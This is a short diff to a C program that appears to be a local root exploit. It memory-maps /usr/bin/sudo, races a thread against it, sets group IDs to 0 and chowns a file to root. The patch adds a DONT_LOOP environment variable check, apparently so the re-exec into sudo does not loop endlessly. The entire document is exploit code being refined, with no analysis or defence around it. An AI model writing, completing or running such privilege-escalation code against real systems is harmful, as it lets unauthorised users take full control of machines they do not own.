@@ -6,6 +6,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <grp.h>
+#include <stdlib.h>
 
 #define SUDO "/usr/bin/sudo"
 
@@ -22,7 +23,7 @@ int main(int argc, char **argv) {
 	setresgid(0,0,0);
 	setgroups(getgroups(128, groups)+1, groups);
 
-	if (geteuid() != 0) {
+	if (geteuid() != 0 && (getenv("DONT_LOOP") == NULL)) {
 		pthread_t pth;
 		int sudo = open(SUDO, O_RDONLY);
 		char *map = (char*)mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, sudo, 0);
@@ -41,6 +42,7 @@ int main(int argc, char **argv) {
 			stop = 1;
 			pthread_join(pth, NULL);
 		}
+		setenv("DONT_LOOP", "1", 1);
 		return execv(SUDO, argv);
 	}
 	chown(us, 0, 0);
